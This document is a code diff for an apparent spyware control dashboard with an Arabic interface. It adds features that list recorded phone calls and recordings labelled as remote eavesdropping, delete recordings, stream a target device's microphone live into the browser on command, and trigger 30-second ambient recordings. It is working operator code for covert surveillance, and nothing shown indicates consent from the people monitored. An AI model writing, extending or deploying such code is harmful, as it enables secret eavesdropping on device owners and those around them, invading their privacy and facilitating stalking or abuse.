@@ -31,6 +31,13 @@ let autoRefreshTimer = null;
 let logsRealtimeSub  = null;
 let realtimeChannels = {};   // keyed by deviceId
 
+// ── Live Mic State ────────────────────────────────────────────────────────────
+let micStreamChannel = null;
+let liveMicAudioCtx  = null;
+let liveMicNextTime  = 0;
+let isLiveMicActive  = false;
+const MIC_SAMPLE_RATE = 16_000;
+
 // ═══════════════════════════════════════════════════════════
 //  INIT
 // ═══════════════════════════════════════════════════════════
@@ -588,29 +595,221 @@ async function fetchAudio() {
             return;
         }
 
-        list.innerHTML = files.filter(f => f.name.match(/\.(m4a|mp3|aac|wav)$/i)).map(f => {
-            const { data: urlData } = db.storage.from('monitoring_data')
-                .getPublicUrl(`audio/${currentDeviceId}/${f.name}`);
-            const url = urlData?.publicUrl || '';
+        const audioFiles = files.filter(f => f.name.match(/\.(m4a|mp3|aac|wav)$/i));
+        if (audioFiles.length === 0) {
+            list.innerHTML = '<div class="empty-state text-sm"><p>لا توجد تسجيلات صوتية</p></div>';
+            return;
+        }
+
+        list.innerHTML = audioFiles.map(f => {
+            const filePath = `audio/${currentDeviceId}/${f.name}`;
+            const { data: urlData } = db.storage.from('monitoring_data').getPublicUrl(filePath);
+            const url    = urlData?.publicUrl || '';
             const sizeKB = f.metadata?.size ? Math.round(f.metadata.size / 1024) : '?';
+            // Detect call vs environment recording
+            const isCall = f.name.startsWith('call_');
+            const icon   = isCall ? '📞' : '🎙️';
+            const iconBg = isCall ? 'bg-blue-500/15 border-blue-500/20' : 'bg-slate-700/60 border-slate-600/40';
+            const label  = isCall
+                ? '<span class="text-[10px] font-bold text-blue-400">مكالمة مسجلة</span>'
+                : '<span class="text-[10px] font-bold text-slate-400">تسجيل عن بُعد (تنصت)</span>';
             return `
-                <div class="audio-card animate-fade">
+                <div class="audio-card animate-fade" id="audio-card-${f.name.replace(/\./g,'_')}">
                     <div class="flex items-center gap-3 flex-1 min-w-0">
-                        <div class="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center text-lg flex-shrink-0">🎙️</div>
+                        <div class="w-10 h-10 rounded-xl ${iconBg} border flex items-center justify-center text-lg flex-shrink-0">${icon}</div>
                         <div class="min-w-0">
+                            ${label}
                             <p class="text-sm font-bold text-slate-200 truncate">${f.name}</p>
                             <p class="text-xs text-slate-500">${formatRelativeTime(f.created_at)} · ${sizeKB} KB</p>
                         </div>
                     </div>
-                    <audio controls class="h-9 w-56 flex-shrink-0" style="accent-color:#22c55e">
-                        <source src="${url}" type="audio/mp4">
-                    </audio>
+                    <div class="flex items-center gap-2 flex-shrink-0">
+                        <audio controls class="h-9 w-44" style="accent-color:#22c55e">
+                            <source src="${url}" type="audio/mp4">
+                        </audio>
+                        <button onclick="deleteAudio('${filePath}', '${f.name.replace(/\./g,'_')}')"
+                            title="حذف التسجيل"
+                            class="w-8 h-8 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400
+                                   hover:bg-red-500/25 hover:text-red-300 flex items-center justify-center
+                                   text-xs transition-all flex-shrink-0">
+                            🗑️
+                        </button>
+                    </div>
                 </div>`;
         }).join('');
     } catch (e) {
         console.error('fetchAudio:', e);
         list.innerHTML = '<div class="empty-state text-red-400 text-xs"><p>خطأ في تحميل التسجيلات</p></div>';
     }
+}
+
+/**
+ * Delete a recording from Supabase Storage.
+ * Uses supabase.storage.remove() (array of paths).
+ */
+async function deleteAudio(filePath, cardId) {
+    if (!confirm(`حذف هذا التسجيل؟\n${filePath.split('/').pop()}`)) return;
+    try {
+        const { error } = await db.storage.from('monitoring_data').remove([filePath]);
+        if (error) throw error;
+        // Animate card out then remove
+        const card = document.getElementById(`audio-card-${cardId}`);
+        if (card) {
+            card.style.transition = 'opacity 0.3s, transform 0.3s';
+            card.style.opacity    = '0';
+            card.style.transform  = 'translateX(20px)';
+            setTimeout(() => { card.remove(); checkAudioListEmpty(); }, 320);
+        }
+        showNotif('🗑️ تم حذف التسجيل', 'success');
+    } catch (e) {
+        console.error('deleteAudio:', e);
+        showNotif('❌ فشل الحذف: ' + (e.message || e), 'error');
+    }
+}
+
+function checkAudioListEmpty() {
+    const list = document.getElementById('audio-list');
+    if (list && list.querySelectorAll('.audio-card').length === 0) {
+        list.innerHTML = '<div class="empty-state text-sm"><p>لا توجد تسجيلات صوتية</p></div>';
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+//  LIVE MIC — Web Audio API Streaming Engine
+// ═══════════════════════════════════════════════════════════
+
+/**
+ * Toggle live mic on/off.
+ * ON  → sends MIC_STREAM command → device starts broadcasting PCM chunks
+ *        via Supabase Realtime channel "mic-stream-{deviceId}".
+ * OFF → sends MIC_STREAM_STOP command → closes AudioContext + channel.
+ */
+function toggleLiveMic() {
+    if (isLiveMicActive) stopLiveMic();
+    else startLiveMic();
+}
+
+async function startLiveMic() {
+    if (!currentDeviceId) return showNotif('⚠️ اختر جهازاً أولاً', 'warn');
+
+    // Initialize Web Audio API context at 16 kHz to match device sample rate
+    try {
+        const AudioCtx = window.AudioContext || /** @type {any} */ (window).webkitAudioContext;
+        liveMicAudioCtx = new AudioCtx({ sampleRate: MIC_SAMPLE_RATE });
+    } catch (e) {
+        showNotif('❌ Web Audio API غير مدعوم في هذا المتصفح', 'error');
+        return;
+    }
+
+    liveMicNextTime = liveMicAudioCtx.currentTime + 0.1; // 100 ms initial buffer
+    isLiveMicActive = true;
+
+    // Subscribe to Supabase Realtime broadcast channel
+    micStreamChannel = db.channel(`mic-stream-${currentDeviceId}`)
+        .on('broadcast', { event: 'audio_chunk' }, ({ payload }) => {
+            if (!payload?.chunk || !isLiveMicActive) return;
+            _playPCMChunk(payload.chunk);
+        })
+        .subscribe();
+
+    // Send command to start streaming on device
+    await sendCommand('MIC_STREAM');
+
+    // Update UI
+    const btn = document.getElementById('live-mic-btn');
+    if (btn) {
+        btn.innerText = '⏹ إيقاف البث';
+        btn.classList.add('bg-red-600/40', 'text-red-200', 'border-red-500/60', 'animate-pulse');
+        btn.classList.remove('bg-red-600/20', 'text-red-400', 'border-red-600/40');
+    }
+    const bar = document.getElementById('live-mic-bar');
+    if (bar) bar.classList.remove('hidden');
+
+    showNotif('🎙️ بث مباشر نشط — يتم الاستماع للجهاز الآن', 'info');
+}
+
+async function stopLiveMic() {
+    isLiveMicActive = false;
+
+    // Tell device to stop streaming
+    await sendCommand('MIC_STREAM_STOP');
+
+    // Tear down realtime subscription
+    if (micStreamChannel) {
+        db.removeChannel(micStreamChannel);
+        micStreamChannel = null;
+    }
+
+    // Close AudioContext
+    if (liveMicAudioCtx) {
+        liveMicAudioCtx.close().catch(() => {});
+        liveMicAudioCtx = null;
+    }
+
+    // Restore button
+    const btn = document.getElementById('live-mic-btn');
+    if (btn) {
+        btn.innerText = '🔴 استماع مباشر';
+        btn.classList.remove('bg-red-600/40', 'text-red-200', 'border-red-500/60', 'animate-pulse');
+        btn.classList.add('bg-red-600/20', 'text-red-400', 'border-red-600/40');
+    }
+    const bar = document.getElementById('live-mic-bar');
+    if (bar) bar.classList.add('hidden');
+
+    showNotif('🎙️ انتهى البث المباشر', 'info');
+}
+
+/**
+ * Decode a base64 Little-Endian PCM_16BIT chunk and schedule it for playback.
+ * Chunks arrive every ~200 ms; we schedule them sequentially on a timeline
+ * to avoid gaps and clicks.
+ */
+function _playPCMChunk(base64Data) {
+    if (!liveMicAudioCtx || !isLiveMicActive) return;
+    try {
+        // Decode Base64 → Uint8Array
+        const binary = atob(base64Data);
+        const bytes  = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+
+        // Interpret as Little-Endian Int16 → normalize to Float32 [-1, 1]
+        const samples = bytes.length / 2;
+        const int16   = new Int16Array(bytes.buffer);
+        const float32 = new Float32Array(samples);
+        for (let i = 0; i < samples; i++) float32[i] = int16[i] / 32768.0;
+
+        // Create and schedule AudioBuffer
+        const audioBuffer = liveMicAudioCtx.createBuffer(1, samples, MIC_SAMPLE_RATE);
+        audioBuffer.copyToChannel(float32, 0);
+
+        const source = liveMicAudioCtx.createBufferSource();
+        source.buffer = audioBuffer;
+        source.connect(liveMicAudioCtx.destination);
+
+        const now = liveMicAudioCtx.currentTime;
+        if (liveMicNextTime < now + 0.02) liveMicNextTime = now + 0.05; // resync if lagging
+        source.start(liveMicNextTime);
+        liveMicNextTime += audioBuffer.duration;
+
+    } catch (e) {
+        console.warn('[LiveMic] PCM decode error:', e);
+    }
+}
+
+/** Send MIC_RECORD command (30 s ambient recording with VAD). */
+async function triggerRecordNow() {
+    if (!currentDeviceId) return showNotif('⚠️ اختر جهازاً أولاً', 'warn');
+    const btn = document.getElementById('record-now-btn');
+    if (btn) {
+        btn.disabled = true;
+        btn.innerText = '⏳ تسجيل...';
+        setTimeout(() => {
+            btn.disabled = false;
+            btn.innerText = '⏺ تسجيل الآن';
+        }, 35_000);
+    }
+    await sendCommand('MIC_RECORD');
+    showNotif('⏺ تسجيل 30 ث بدأ — سيُرفع تلقائياً إن كان فيه صوت', 'info');
 }
 
 // ═══════════════════════════════════════════════════════════
